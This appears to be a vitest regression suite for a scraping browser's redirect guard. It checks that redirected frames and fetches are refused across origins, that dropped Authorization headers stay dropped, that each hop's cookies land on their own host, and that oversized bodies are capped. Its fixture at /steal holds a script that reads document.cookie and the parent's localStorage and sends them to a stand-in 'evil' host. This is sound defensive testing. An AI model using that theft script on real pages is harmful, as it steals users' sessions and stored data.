import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import type { BrowserSession } from "@offerfinch/core/scrape/browser";
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";

import { fixtureBrowser, siteBrowser } from "./browser";

/**
 * Codex review of PR #149 (2026-11-09, after the guard began following redirects itself,
 * `followChecked`), three P1s:
 * 1. A frame or subresource that redirected was fulfilled under its first URL, so it took the first
 *    URL's origin: a frame on `boards.acme.test` redirected to `evil.acme.test` read the board's
 *    cookies and the parent's localStorage and posted them as the board.
 * 2. The final hop's `Set-Cookie` was applied to the first host on fulfill (`localhost` →
 *    `127.0.0.1` put the final host's cookie on both, and a `Domain=localhost` cookie appeared).
 * 3. Each hop rebuilt its headers from the first request, so after A → B dropped `Authorization`,
 *    a further B → B hop sent it again.
 * And: a fetched hop's body was buffered without a limit.
 */
let server: Server;
let port = 0;
const hits: string[] = [];
/** The `authorization` header each request arrived with, by "METHOD host/path". */
const credentials = new Map<string, string>();
/** What the evil frame managed to read, from its `/report` query. */
const reports: string[] = [];
const BIG = 26 * 1024 * 1024;
// Literal, not the module's constants: the same file runs against the code before the fix.
const CROSS_ORIGIN_REFUSED = "cross-origin redirect refused";
const TOO_LARGE_REFUSED = "answer too large, refused";
const REDIRECT_FOLLOWED = "redirect followed";

beforeAll(async () => {
	server = createServer((req, res) => {
		const host = String(
			req.headers["x-fixture-host"] ?? req.headers.host ?? "",
		).replace(/:\d+$/, "");
		const path = (req.url ?? "").split("?")[0] ?? "";
		const hit = `${req.method} ${host}${path}`;
		hits.push(hit);
		if (req.headers.authorization)
			credentials.set(hit, req.headers.authorization);
		if (path === "/report") reports.push(req.url ?? "");
		const at = (name: string, to: string) => `http://${name}:${port}${to}`;
		const redirects: Record<string, [number, string]> = {
			"/frame-evil": [302, at("evil.acme.test", "/steal")],
			"/frame-same": [302, "/frame-hop"],
			"/frame-hop": [302, "/frame-landed"],
			"/fetch-evil": [302, at("evil.acme.test", "/data")],
			"/fetch-same": [307, "/fetch-same-2"],
			"/fetch-same-2": [307, "/data"],
			// A → B → B: B must never see the credential, however many hops it takes.
			"/auth-chain": [302, at("cdn.acme.test", "/auth-2")],
			"/auth-2": [302, at("cdn.acme.test", "/data")],
			// A → B → A: back on the first origin, the dropped credential stays dropped.
			"/auth-back": [302, at("cdn.acme.test", "/auth-back-2")],
			"/auth-back-2": [302, at("boards.acme.test", "/data")],
			"/big-chain": [302, "/big"],
		};
		const redirect = redirects[path];
		res.setHeader("access-control-allow-origin", "*");
		res.setHeader(
			"access-control-allow-headers",
			"content-type, authorization",
		);
		if (req.method === "OPTIONS") {
			res.writeHead(204);
			return res.end();
		}
		if (redirect) {
			res.writeHead(redirect[0], { location: redirect[1] });
			return res.end();
		}
		if (path === "/data") {
			res.writeHead(200, { "content-type": "application/json" });
			return res.end(JSON.stringify({ ok: true, host, method: req.method }));
		}
		if (path === "/big") {
			res.writeHead(200, { "content-type": "application/octet-stream" });
			return res.end(Buffer.alloc(BIG, 97));
		}
		if (path === "/steal") {
			res.writeHead(200, { "content-type": "text/html" });
			return res.end(`<html><body><script>
				let stored = "";
				try { stored = parent.localStorage.getItem("secret") ?? ""; } catch (e) { stored = "blocked"; }
				fetch("/report?cookie=" + encodeURIComponent(document.cookie) + "&stored=" + encodeURIComponent(stored));
			</script></body></html>`);
		}
		if (path === "/frame-landed") {
			res.writeHead(200, { "content-type": "text/html" });
			return res.end(
				`<html><body><script>fetch("/landed-ran?origin=" + encodeURIComponent(location.origin));</script></body></html>`,
			);
		}
		res.writeHead(200, { "content-type": "text/html" });
		res.end("<html><body>probe</body></html>");
	});
	await new Promise<void>((resolve) => server.listen(0, resolve));
	port = (server.address() as AddressInfo).port;
});

afterAll(async () => {
	await new Promise<void>((resolve) => server.close(() => resolve()));
});

beforeEach(() => {
	hits.length = 0;
	credentials.clear();
	reports.length = 0;
});

type Page = Awaited<ReturnType<BrowserSession["newPage"]>>;

async function withBoard<T>(
	network: "read_only" | "allowlist",
	run: (page: Page) => Promise<T>,
): Promise<T> {
	const session = await siteBrowser(port).openSession({
		network,
		allowedHosts: ["boards.acme.test", "cdn.acme.test", "evil.acme.test"],
		refusePrivateNetwork: true,
	});
	try {
		const page = await session.newPage();
		await page.goto(`http://boards.acme.test:${port}/main`);
		await page.evaluate(
			`document.cookie = "board=secret-cookie; path=/"; localStorage.setItem("secret", "secret-storage")`,
		);
		return await run(page);
	} finally {
		await session.close();
	}
}

const frame = (src: string) => `(() => {
	const frame = document.createElement("iframe");
	frame.src = ${JSON.stringify(src)};
	document.body.appendChild(frame);
})()`;

describe.each(["read_only", "allowlist"] as const)(
	"%s: a redirect is never fulfilled under another origin",
	(network) => {
		it("refuses a frame redirected to another origin: it reads nothing of the board", async () => {
			const log = await withBoard(network, async (page) => {
				await page.evaluate(frame("/frame-evil"));
				await page.waitForTimeout(1_500);
				return page.networkLog();
			});
			expect(reports, JSON.stringify(reports)).toEqual([]);
			expect(hits).not.toContain("GET boards.acme.test/report");
			expect(hits).not.toContain("GET evil.acme.test/report");
			expect(
				log.find(
					(e) =>
						!e.allowed &&
						e.url === `http://evil.acme.test:${port}/steal` &&
						e.reason === CROSS_ORIGIN_REFUSED,
				),
				JSON.stringify(log),
			).toBeDefined();
		});

		it("refuses a fetch redirected to another origin", async () => {
			const answer = await withBoard(network, (page) =>
				page.evaluate<string>(
					`fetch("/fetch-evil").then((r) => r.text(), (e) => "failed: " + e.message)`,
				),
			);
			expect(answer).toMatch(/^failed/);
		});

		it("still follows a chain that stays on the first origin (fetch and frame)", async () => {
			const answer = await withBoard(network, async (page) => {
				const data = await page.evaluate(
					`fetch("/fetch-same", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ query: "query { jobs }" }) }).then((r) => r.json())`,
				);
				await page.evaluate(frame("/frame-same"));
				await page.waitForTimeout(1_500);
				return { data, log: page.networkLog() };
			});
			expect(answer.data).toEqual({
				ok: true,
				host: "boards.acme.test",
				method: "POST",
			});
			expect(hits).toContain("GET boards.acme.test/landed-ran");
			expect(
				answer.log.filter((e) => e.reason === REDIRECT_FOLLOWED).length,
			).toBeGreaterThanOrEqual(4);
		});

		it("never sends a dropped credential again, however many hops follow", async () => {
			await withBoard(network, (page) =>
				page.evaluate(`Promise.all([
					fetch("/auth-chain", { headers: { authorization: "Bearer SECRET" } }).catch(() => {}),
					fetch("/auth-back", { headers: { authorization: "Bearer SECRET" } }).catch(() => {}),
				])`),
			);
			expect(hits).toEqual(
				expect.arrayContaining([
					"GET cdn.acme.test/auth-2",
					"GET cdn.acme.test/data",
					"GET cdn.acme.test/auth-back-2",
					"GET boards.acme.test/data",
				]),
			);
			expect(credentials.get("GET boards.acme.test/auth-chain")).toBe(
				"Bearer SECRET",
			);
			expect(credentials.get("GET boards.acme.test/auth-back")).toBe(
				"Bearer SECRET",
			);
			expect(credentials.has("GET cdn.acme.test/auth-2")).toBe(false);
			expect(credentials.has("GET cdn.acme.test/data")).toBe(false);
			expect(credentials.has("GET cdn.acme.test/auth-back-2")).toBe(false);
			expect(credentials.has("GET boards.acme.test/data")).toBe(false);
		});

		it("refuses a fetched answer larger than the cap, quietly", async () => {
			const { answer, log } = await withBoard(network, async (page) => ({
				answer: await page.evaluate<string>(
					`fetch("/big-chain").then((r) => r.text().then((t) => "read " + t.length), (e) => "failed: " + e.message)`,
				),
				log: page.networkLog(),
			}));
			expect(answer).toMatch(/^failed/);
			expect(
				log.find(
					(e) =>
						!e.allowed &&
						e.url.endsWith("/big") &&
						e.reason === TOO_LARGE_REFUSED,
				),
				JSON.stringify(log),
			).toBeDefined();
		});
	},
);

describe("allowlist: cookies of a followed hop", () => {
	let cookieServer: Server;
	let cookiePort = 0;

	beforeAll(async () => {
		cookieServer = createServer((req, res) => {
			const path = (req.url ?? "").split("?")[0] ?? "";
			if (path === "/post-chain") {
				res.writeHead(307, {
					location: `http://127.0.0.1:${cookiePort}/mid`,
				});
				return res.end();
			}
			if (path === "/mid") {
				res.writeHead(307, {
					location: `http://127.0.0.1:${cookiePort}/final`,
					"set-cookie": "mid=1; Path=/",
				});
				return res.end();
			}
			if (path === "/final") {
				res.writeHead(200, {
					"content-type": "text/html",
					"set-cookie": [
						"hop=final; Path=/",
						"dom=x; Path=/; Domain=localhost",
					],
				});
				return res.end("<html><body>sent</body></html>");
			}
			res.writeHead(200, { "content-type": "text/html" });
			res.end(
				`<html><body><form method="post" action="/post-chain"><input name="a" value="b"><button>Send</button></form></body></html>`,
			);
		});
		await new Promise<void>((resolve) =>
			cookieServer.listen(0, "127.0.0.1", resolve),
		);
		cookiePort = (cookieServer.address() as AddressInfo).port;
	});

	afterAll(async () => {
		await new Promise<void>((resolve) => cookieServer.close(() => resolve()));
	});

	it("stores each hop's cookies on that hop's own host only, never on the first", async () => {
		const session = await fixtureBrowser().openSession({
			network: "allowlist",
			allowedHosts: ["localhost", "127.0.0.1"],
		});
		try {
			const page = await session.newPage();
			await page.goto(`http://localhost:${cookiePort}/form`);
			await page.evaluate(`document.querySelector("form").submit()`);
			await page.waitForTimeout(1_500);
			const log = page.networkLog();
			expect(
				log.filter((e) => e.reason === REDIRECT_FOLLOWED).map((e) => e.url),
			).toEqual([
				`http://127.0.0.1:${cookiePort}/mid`,
				`http://127.0.0.1:${cookiePort}/final`,
			]);
			await page.goto(`http://localhost:${cookiePort}/form`);
			const onFirst = await page.evaluate<string>("document.cookie");
			await page.goto(`http://127.0.0.1:${cookiePort}/form`);
			const onHop = await page.evaluate<string>("document.cookie");
			expect(onFirst).toBe("");
			// The fetch context shares the browser context's cookie store: each hop's own cookies
			// are there, against the hop's real host.
			expect(onHop.split("; ").sort()).toEqual(["hop=final", "mid=1"]);
		} finally {
			await session.close();
		}
	});
});
